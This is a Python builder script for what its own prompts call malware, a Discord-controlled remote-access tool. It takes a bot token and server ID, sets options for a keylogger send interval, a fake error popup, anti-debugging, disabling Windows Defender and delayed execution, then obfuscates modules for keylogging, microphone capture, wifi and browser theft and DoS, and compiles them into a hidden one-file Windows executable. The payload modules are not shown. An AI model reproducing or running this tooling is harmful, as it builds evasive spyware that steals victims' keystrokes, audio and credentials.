import subprocess, requests
import os
import shutil
from colorama import Fore, Style
import sys
import time
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
#import venv


def check_token(token):
    headers = {
        "Authorization": f"Bot {token}"
    }

    url = "https://discord.com/api/v10/users/@me"
    try:
        response = requests.get(url, headers=headers)
    except:
        return False
    
    if response.status_code == 200:
        return True
    else:
        return False


def create_env(dir):
    progress.start()
    task = progress.add_task("Creating env...", total=1)

    #try:
    #    shutil.rmtree("build")
    #except: pass


    files = ["main.py", "modules/browser.py", "modules/antidebug.py", "modules/info.py", "modules/wifi.py", "modules/startup.py", "modules/keylogger.py", "modules/mic.py", "modules/dos.py", "modules/firefox.py"]
    path = os.path.join(os.getcwd(), dir)
    
    if not os.path.exists(path):
        progress.stop()
        print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
        time.sleep(3)
        sys.exit(1)

    #os.mkdir(os.path.join(os.getcwd(), "build"))
    os.mkdir(os.path.join(os.getcwd(), "build", "modules"))
    

    #requirements = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/requirements.txt").text
    #open("req.txt", "w", encoding="utf8").write(requirements)
    #subprocess.run("pip install -r req.txt")

    #venv.create("venv", with_pip=True)
    #subprocess.run("venv/scripts/pip install -r req.txt")

    for file in files:
        try:
            shutil.copyfile(f"{path}/{file}", f"build/{file}")
        except:
            progress.stop()
            print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
            time.sleep(3)
            sys.exit(1)
    
    progress.update(task, advance=1)


def obfuscate():
    task1 = progress.add_task("Obfuscating...", total=1)
    try:
        #subprocess.run(f"python -m pyminifier -o build/main.py build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# main.py
        #subprocess.run(f"python -m pyminifier -o build/modules/browser.py build/modules/browser.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/browser.py
        #subprocess.run(f"python -m pyminifier -o build/modules/info.py build/modules/info.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/info.py
        #subprocess.run(f"python -m pyminifier -o build/modules/startup.py build/modules/startup.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/startup.py
        #subprocess.run(f"python -m pyminifier -o build/modules/antidebug.py build/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
        #subprocess.run(f"python -m pyminifier -o build/modules/wifi.py build/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
        #subprocess.run(f"python -m pyminifier -o build/modules/keylogger.py build/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
        #subprocess.run(f"python -m pyminifier -o build/modules/mic.py build/modules/mic.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/mic.py
        #subprocess.run(f"python -m pyminifier -o build/modules/dos.py build/modules/dos.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/dos.py
        #subprocess.run(f"python -m pyminifier -o build/modules/firefox.py build/modules/firefox.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/firefox.py

        subprocess.run(f"pyminify build/ --in-place", stdout=subprocess.DEVNULL, shell=True) # build/*
        progress.update(task1, advance=1)
    except:
        progress.stop()
        print("[-] To obfuscate please install python-minifier or disable obfuscation from building options!")
        time.sleep(3)
        sys.exit(1)
    

def build(path, icon, tkinter_required, obf=True):
    create_env(path)
    if obf: obfuscate()
    task2 = progress.add_task("Compiling...", total=1)

    enable_plugins_arg = f"--enable-plugins={'tk-inter' if tkinter_required else ''}"
    cmd = f"python -m nuitka build/main.py --clang {enable_plugins_arg if enable_plugins_arg != '--enable-plugins=' else ''} --disable-console --clean-cache=all --remove-output --output-dir=dist --onefile --standalone  --windows-icon-from-ico={icon}"

    try: 
        #python -m nuitka main.py --clang --enable-plugins=tk-inter --disable-console --clean-cache=all --remove-output --output-dir=build --onefile --standalone # --windows-icon-from-ico={icon}
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

        progress.update(task2, advance=1)
        progress.stop()
        print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
        time.sleep(3)
    except:
        progress.stop()
        print(Fore.RED +"[-] Please make sure you have nuitka installed!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(1)
    
    shutil.rmtree("build")
    #os.remove("req.txt")
    #shutil.rmtree("venv")


def convert(value, name):
    if value.lower() == "y":
        return True
    elif value.lower() == "n":
        return False
    else:
        print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(0)


def config(token, guild_id, interval, error, antidebug, defender, move, exec_delay, delay):    
    config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}\nEXEC_DELAY = {exec_delay}\nDELAY = {delay}"

    build_dir = os.path.join(os.getcwd(), "build")
    
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
        os.mkdir(build_dir)
    else:
        os.makedirs(build_dir)
    
    with open(f"build\config.py", "w", encoding="utf8") as f:
        f.write(config)


progress = Progress(
    TextColumn("[bold blue]{task.description}", justify="right"),
    BarColumn(bar_width=None),
    SpinnerColumn(style="bold", spinner_name="simpleDotsScrolling", speed=1),
    TimeElapsedColumn()
)

while True:
    token = input("[?] Enter bot token: ")
    if not check_token(token): print(Fore.RED +"[-] Invalid bot token provided!"+ Style.RESET_ALL); continue

    guild_id = input("[?] Enter server ID (guild ID): ")
    interval = input("[?] Enter interval for keylogger sending (in secondes): ")
    error = input("[?] Enable fake error? [Y/n]: ")
    antidebug = input("[?] Enable antidebug? [Y/n]: ")
    defender = input("[?] Enable win defender disabler? [Y/n]: ")
    move = input("[?] Move the malware to the special location? [Y/n]: ")
    exec_delay = input("[?] Enable delay before executing malware? [Y/n]: ")

    if exec_delay.lower() == "y":
        delay = input("[?] Enter how long to wait before executing malware (in seconds): ") 
    else: 
        delay = 0


    choice = input("> Do you want to edit building options[y/N]: ")
    if choice.lower() == "y":
        obf = input("[?] Do you want to enable obfuscation? [Y/n]: ")
        icon = input("[?] Enter icon file: ")
        path = input("[?] Enter source code directory: ")
        
        config(
            token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), 
            convert(defender, "defender disabler"), convert(move, "move"), convert(exec_delay, "execution delay"), delay
            )
        
        build(path=path, icon=icon, tkinter_required=convert(error, "error"),  obf=convert(obf, "obfuscation"))
        break

    elif choice.lower() == "n":
        config(
            token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"),
                convert(defender, "defender disabler"), convert(move, "move"), convert(exec_delay, "execution delay"), delay
            )
        build(path="src", icon="icon.png", tkinter_required=convert(error, "error"))
        break

    else:
        print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
        time.sleep(3)
        continue
